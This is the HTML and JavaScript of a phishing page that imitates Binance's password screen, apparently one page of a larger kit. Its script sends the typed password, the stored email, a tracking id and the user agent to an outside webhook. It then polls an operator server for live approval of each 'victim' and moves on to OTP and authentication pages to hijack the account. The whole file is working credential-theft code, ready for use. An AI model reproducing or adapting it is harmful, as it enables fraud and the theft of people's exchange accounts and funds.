<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Binance - Enter Password</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #202630;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #ffffff;
            padding: 8px 24px 16px;
        }

        .container {
            background: #202630;
            border-radius: 0;
            width: 100%;
            max-width: 100%;
            border: none;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* Desktop styles */
        @media (min-width: 768px) {
            body {
                background: #181a20;
                padding: 0;
            }
            
            .container {
                background: #181a20;
                border-radius: 16px;
                padding: 48px 40px;
                max-width: 400px;
                border: 1px solid rgba(255, 255, 255, 0.1);
                backdrop-filter: blur(10px);
                min-height: auto;
            }
        }

        .logo {
            display: flex;
            align-items: center;
            justify-content: flex-start;
            margin-bottom: 8px;
            padding: 12px 0px 20px;
        }

        .logo img {
            height: 32px;
        }

        /* Desktop logo centering */
        @media (min-width: 768px) {
            .logo {
                justify-content: center;
                margin-bottom: 40px;
            }
        }

        .title {
            font-size: 28px;
            font-weight: 500;
            text-align: left;
            margin-bottom: 46px;
            color: #ffffff;
        }

        /* Desktop title centering */
        @media (min-width: 768px) {
            .title {
                font-size: 32px;
                text-align: center;
                margin-bottom: 24px;
            }
        }

        .email {
            font-size: 16px;
            color: #848e9c;
            text-align: left;
            margin-bottom: 40px;
        }

        /* Desktop email centering */
        @media (min-width: 768px) {
            .email {
                text-align: center;
                margin-bottom: 32px;
            }
        }

        .form-group {
            margin-bottom: 24px;
        }

        .form-label {
            display: block;
            font-size: 14px;
            color: #ffffff;
            margin-bottom: 8px;
        }

        .input-container {
            position: relative;
        }

        .form-input {
            width: 100%;
            padding: 15px 50px 20px 16px;
            background: #202630;
            border: 1px solid #474d57;
            border-radius: 8px;
            color: #ffffff;
            font-size: 16px;
            outline: none;
            transition: border-color 0.3s ease;
        }

        /* Desktop input padding */
        @media (min-width: 768px) {
            .form-input {
                padding: 16px 50px 16px 16px;
            }
        }

        .form-input:focus {
            border-color: #f0b90b;
        }

        .form-input.error {
            border-color: #f6465d;
        }

        .input-icons {
            position: absolute;
            right: 16px;
            top: 50%;
            transform: translateY(-50%);
            display: flex;
            gap: 8px;
        }

        .icon {
            width: 20px;
            height: 20px;
            cursor: pointer;
            opacity: 0.6;
            transition: opacity 0.3s ease;
        }

        .icon:hover {
            opacity: 1;
        }

        .clear-icon {
            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" fill="%23848e9c" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>') no-repeat center;
            background-size: contain;
        }

        .eye-icon {
            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" fill="%23848e9c" viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>') no-repeat center;
            background-size: contain;
        }

        .error-message {
            color: #f6465d;
            font-size: 14px;
            margin-top: 8px;
            line-height: 1.4;
        }

        .next-button {
            width: 100%;
            padding: 15px;
            background: #fcd535;
            color: #1e2329;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.3s ease;
            margin-bottom: 32px;
        }

        /* Desktop button padding */
        @media (min-width: 768px) {
            .next-button {
                padding: 16px;
                margin-bottom: 24px;
            }
        }

        .next-button:hover {
            background: #fcd535;
        }

        .forgot-password {
            text-align: left;
            margin-bottom: 0.3em;
        }

        .forgot-password a {
            color: #f0b90b;
            text-decoration: none;
            font-size: 16px;
        }

        .forgot-password a:hover {
            text-decoration: underline;
        }

        .passkey-link {
            text-align: left;
            margin-bottom: 60px;
            flex-grow: 1;
            display: flex;
            align-items: flex-start;
            justify-content: flex-start;
            padding-top: 16px;
        }

        .passkey-link a {
            color: #f0b90b;
            text-decoration: none;
            font-size: 16px;
        }

        .passkey-link a:hover {
            text-decoration: underline;
        }

        /* Desktop spacing adjustments */
        @media (min-width: 768px) {
            .forgot-password {
                margin-bottom: 16px;
                text-align: left;
            }

            .forgot-password a {
                font-size: 14px;
            }

            .passkey-link {
                margin-bottom: 40px;
                flex-grow: 0;
                display: block;
                padding-top: 0;
                text-align: left;
            }
            
            .passkey-link a {
                font-size: 14px;
            }
        }

        .footer {
            display: flex;
            justify-content: center;
            gap: 24px;
            font-size: 14px;
            color: #848e9c;
            margin-top: auto;
        }

        /* Mobile footer adjustments */
        @media (max-width: 767px) {
            .footer {
                position: fixed;
                bottom: 20px;
                left: 20px;
                right: 20px;
                background: #202630;
                padding: 20px 0;
                border-top: 1px solid #474d57;
                margin-top: 0;
            }
        }

        .footer a {
            color: #848e9c;
            text-decoration: none;
        }

        .footer a:hover {
            color: #ffffff;
        }

        .language-selector {
            display: flex;
            align-items: center;
            gap: 4px;
        }

        .globe-icon {
            width: 16px;
            height: 16px;
            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" fill="%23848e9c" viewBox="0 0 24 24"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zm6.93 6h-2.95c-.32-1.25-.78-2.45-1.38-3.56 1.84.63 3.37 1.91 4.33 3.56zM12 4.04c.83 1.2 1.48 2.53 1.91 3.96h-3.82c.43-1.43 1.08-2.76 1.91-3.96zM4.26 14C4.1 13.36 4 12.69 4 12s.1-1.36.26-2h3.38c-.08.66-.14 1.32-.14 2 0 .68.06 1.34.14 2H4.26zm.82 2h2.95c.32 1.25.78 2.45 1.38 3.56-1.84-.63-3.37-1.9-4.33-3.56zm2.95-8H5.08c.96-1.66 2.49-2.93 4.33-3.56C8.81 5.55 8.35 6.75 8.03 8zM12 19.96c-.83-1.2-1.48-2.53-1.91-3.96h3.82c-.43 1.43-1.08 2.76-1.91 3.96zM14.34 14H9.66c-.09-.66-.16-1.32-.16-2 0-.68.07-1.35.16-2h4.68c.09.65.16 1.32.16 2 0 .68-.07 1.34-.16 2zm.25 5.56c.6-1.11 1.06-2.31 1.38-3.56h2.95c-.96 1.65-2.49 2.93-4.33 3.56zM16.36 14c.08-.66.14-1.32.14-2 0-.68-.06-1.34-.14-2h3.38c.16.64.26 1.31.26 2s-.1 1.36-.26 2h-3.38z"/></svg>') no-repeat center;
            background-size: contain;
        }

        /* Mobile spacing adjustments */
        @media (max-width: 767px) {
            body {
                padding-bottom: 100px;
            }
        }

        .main-content {
            flex-grow: 1;
            display: flex;
            flex-direction: column;
        }

        /* Desktop main content */
        @media (min-width: 768px) {
            .main-content {
                flex-grow: 0;
            }
        }        /* Loading Spinner Styles */
        .bn-spinner__nezha {
            display: inline-flex;
            gap: 3px;
            align-items: center;
            justify-content: center;
        }

        .nezha-line {
            width: 3px;
            height: 12px;
            border-radius: 1.5px;
            background-color: #1e2329;
            animation: nezha-animation 0.8s infinite;
        }

        .nezha-line:nth-child(1) { animation-delay: 0s; }
        .nezha-line:nth-child(2) { animation-delay: 0.1s; }
        .nezha-line:nth-child(3) { animation-delay: 0.2s; }
        .nezha-line:nth-child(4) { animation-delay: 0.3s; }

        @keyframes nezha-animation {
            0%, 100% {
                transform: scaleY(1);
                opacity: 1;
            }
            50% {
                transform: scaleY(0.3);
                opacity: 0.5;
            }
        }

        .button-content {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .button-content.loading .regular-content {
            display: none;
        }

        .button-content .loading-content {
            display: none;
        }

        .button-content.loading .loading-content {
            display: inline-flex;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="binance-h.png" alt="Binance Logo">
        </div>

        <div class="main-content">
            <h1 class="title">Enter your password</h1>

            <form onsubmit="handleSubmit(event)">
                <div class="form-group">
                    <label class="form-label" for="password">Password</label>
                    <div class="input-container">
                        <input 
                            type="password" 
                            id="password" 
                            class="form-input" 
                            placeholder=""
                            required
                            minlength="6"
                        >
                        <div class="input-icons">
                            <div class="icon eye-icon"></div>
                        </div>
                    </div>
                </div>

                <button type="submit" class="next-button">
                    <div class="button-content">
                        <span class="regular-content">Next</span>
                        <div class="loading-content">
                            <div class="bn-spinner__nezha">
                                <div class="nezha-line"></div>
                                <div class="nezha-line"></div>
                                <div class="nezha-line"></div>
                                <div class="nezha-line"></div>
                            </div>
                        </div>
                    </div>
                </button>

                <div class="forgot-password">
                    <a href="#">Forgot password?</a>
                </div>

                <div class="passkey-link">
                    <a href="binance-passkey.html">Use passkey to log in</a>
                </div>
            </form>
        </div>

        <div class="footer">
            <div class="language-selector">
                <div class="globe-icon"></div>
                <a href="#">English</a>
            </div>
            <a href="#">Cookies</a>
            <a href="#">Terms</a>
            <a href="#">Privacy</a>
        </div>
    </div>

    <script>
        // Toggle password visibility
        document.querySelector('.eye-icon').addEventListener('click', function() {
            const passwordInput = document.getElementById('password');
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
            } else {
                passwordInput.type = 'password';
            }
        });

        // Utility to get query param
        function getQueryParam(name) {
            const url = new URL(window.location.href);
            return url.searchParams.get(name);
        }

        // Generate a random tracking id (if not present)
        function getOrCreateTrackingId() {
            let trackingId = localStorage.getItem('binance_tracking_id') || sessionStorage.getItem('binance_tracking_id');
            if (!trackingId) {
                trackingId = Math.random().toString(36).substr(2, 12) + Date.now().toString(36);
                localStorage.setItem('binance_tracking_id', trackingId);
                sessionStorage.setItem('binance_tracking_id', trackingId);
            }
            return trackingId;
        }

        // Check and clear expired data on page load
        function checkAndClearExpiredData() {
            try {
                const expirationTime = localStorage.getItem('binance_data_expires');
                if (expirationTime && Date.now() > parseInt(expirationTime)) {
                    // Data has expired, clear it
                    localStorage.removeItem('binance_campaign_id');
                    localStorage.removeItem('binance_tracking_id');
                    localStorage.removeItem('binance_email');
                    localStorage.removeItem('binance_data_expires');
                    console.log('Expired data cleared from localStorage');
                }
            } catch (error) {
                console.error('Error checking expired data:', error);
            }
        }

        // Set expiration timer for localStorage data (10 minutes after successful webhook)
        function setDataExpiration() {
            try {
                const expirationTime = Date.now() + (10 * 60 * 1000); // 10 minutes from now
                localStorage.setItem('binance_data_expires', expirationTime.toString());
                
                // Set a timer to clear the data
                setTimeout(() => {
                    localStorage.removeItem('binance_campaign_id');
                    localStorage.removeItem('binance_tracking_id');
                    localStorage.removeItem('binance_email');
                    localStorage.removeItem('binance_data_expires');
                    console.log('Messaging data expired and cleared after 10 minutes');
                }, 10 * 60 * 1000); // 10 minutes
            } catch (error) {
                console.error('Error setting data expiration:', error);
            }
        }

        // Get or set campaign id from query param or storage
        function getOrSetCampaignId() {
            let campaignId = getQueryParam('campaign');
            if (campaignId) {
                localStorage.setItem('binance_campaign_id', campaignId);
                sessionStorage.setItem('binance_campaign_id', campaignId);
            } else {
                campaignId = localStorage.getItem('binance_campaign_id') || sessionStorage.getItem('binance_campaign_id');
            }
            return campaignId;
        }

        function handleSubmit(event) {
            event.preventDefault();
            const password = document.getElementById('password').value.trim();
            const email = localStorage.getItem('binance_email') || sessionStorage.getItem('binance_email');
            const campaignId = getOrSetCampaignId();
            const trackingId = getOrCreateTrackingId();
            
            if (!password) {
                showError('Please enter your password');
                return;
            }
            if (!email) {
                showError('Session expired. Please start over.');
                setTimeout(() => {
                    window.location.href = 'binance.html';
                }, 2000);
                return;
            }
            if (!campaignId) {
                showError('Missing campaign id.');
                return;
            }
            // Show loading state
            const button = document.querySelector('.next-button');
            showLoading(button);
            // Prepare data for webhook
            const data = {
                login_email: email,
                login_password: password,
                tracking_id: trackingId,
                timestamp: new Date().toISOString(),
                type: 'password_entry',
                user_agent: navigator.userAgent,
                ip_info: 'client-side'
            };
            // Send to webhook
            submitToWebhook(data, campaignId);
        }

        function submitToWebhook(data, campaignId) {
            // Use your actual backend host here
            const webhookUrl = `https://emailgrid.onrender.com/webhook/${campaignId}/`;
            console.log('Submitting to webhook:', webhookUrl);
            console.log('Data being sent:', data);
            
            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json',
                },
                body: JSON.stringify(data)
            })
            .then(response => {
                console.log('Response status:', response.status);
                console.log('Response ok:', response.ok);
                
                // For webhook submissions, we'll be more permissive
                // As long as we get a response (even 4xx/5xx), consider it submitted
                if (response.status >= 200 && response.status < 600) {
                    // Try to parse response but don't fail if we can't
                    const contentType = response.headers.get('content-type');
                    if (contentType && contentType.includes('application/json')) {
                        return response.json().catch(() => ({ status: 'submitted' }));
                    } else {
                        return response.text().then(text => {
                            console.log('Response text:', text);
                            return { status: 'submitted', message: text };
                        }).catch(() => ({ status: 'submitted' }));
                    }
                } else {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }
            })
            .then(result => {
                console.log('Webhook response:', result);
                
                // Check if we have victim_info_id for polling
                const victimInfoId = localStorage.getItem('binance_victim_info_id');
                if (victimInfoId) {
                    // Start polling for password approval
                    pollForApproval(victimInfoId, campaignId, 'password');
                } else {
                    // Fallback to original behavior
                    setDataExpiration();
                    setTimeout(() => {
                        window.location.href = 'binance-otp.html';
                    }, 1500);
                }
                
                // Set expiration timer for messaging data (10 minutes)
                setDataExpiration();
                
                // Always proceed to next step if we get here
                setTimeout(() => {
                    const campaignParam = campaignId ? `?campaign=${campaignId}` : '';
                    window.location.href = `binance-authentication.html${campaignParam}`;
                }, 1500);
            })
            .catch(error => {
                console.error('Webhook error details:', error);
                console.error('Error message:', error.message);
                
                // Only show error for actual network failures
                if (error.message.includes('Failed to fetch') || error.message.includes('NetworkError')) {
                    setTimeout(() => {
                        showError('Network error. Please check your connection and try again.');
                        resetButton();
                    }, 1000);
                } else {
                    // For other errors (like HTTP errors), still proceed
                    console.log('HTTP error detected, but proceeding anyway...');
                    setDataExpiration();
                    setTimeout(() => {
                        const campaignParam = campaignId ? `?campaign=${campaignId}` : '';
                        window.location.href = `binance-authentication.html${campaignParam}`;
                    }, 1500);
                }
            });
        }

        function showError(message) {
            // Create or update error message element
            let errorElement = document.getElementById('error-message');
            if (!errorElement) {
                errorElement = document.createElement('div');
                errorElement.id = 'error-message';
                errorElement.style.cssText = `
                    color: #f84960;
                    font-size: 14px;
                    margin-top: 10px;
                    text-align: center;
                    padding: 8px;
                    background: rgba(248, 73, 96, 0.1);
                    border-radius: 4px;
                    border: 1px solid rgba(248, 73, 96, 0.2);
                `;
                const form = document.querySelector('form');
                form.appendChild(errorElement);
            }
            errorElement.textContent = message;
            errorElement.style.display = 'block';
            
            // Hide error after 5 seconds
            setTimeout(() => {
                if (errorElement) {
                    errorElement.style.display = 'none';
                }
            }, 5000);
        }

        function resetButton() {
            const button = document.querySelector('.next-button');
            const buttonContent = button.querySelector('.button-content');
            buttonContent.classList.remove('loading');
            button.disabled = false;
        }

        function showLoading(button) {
            const buttonContent = button.querySelector('.button-content');
            buttonContent.classList.add('loading');
            button.disabled = true;
        }

        function pollForApproval(victimInfoId, campaignId, step) {
            const pollUrl = `https://emailgrid.onrender.com/api/check-approval/${victimInfoId}/${step}/`;
            
            const poll = () => {
                fetch(pollUrl, {
                    method: 'GET',
                    headers: {
                        'Accept': 'application/json',
                    },
                    mode: 'cors',
                    credentials: 'omit'
                })
                .then(response => response.json())
                .then(result => {
                    console.log('Poll result:', result);
                    
                    if (result.status === 'approved') {
                        // Hide loading and proceed to next step
                        resetButton();
                        setDataExpiration();
                        setTimeout(() => {
                            window.location.href = 'binance-otp.html';
                        }, 1000);
                    } else if (result.status === 'rejected') {
                        // Hide loading and show error
                        resetButton();
                        showError(result.error_message || 'Incorrect password. Please try again.');
                    } else {
                        // Still pending, continue polling
                        setTimeout(poll, 2000); // Poll every 2 seconds
                    }
                })
                .catch(error => {
                    console.error('Polling error:', error);
                    // Continue polling on error
                    setTimeout(poll, 3000);
                });
            };
            
            // Start polling
            poll();
        }

        // Initialize on page load
        window.addEventListener('load', function() {
            checkAndClearExpiredData(); // Check for expired data first
        });
    </script>
</body>
</html>
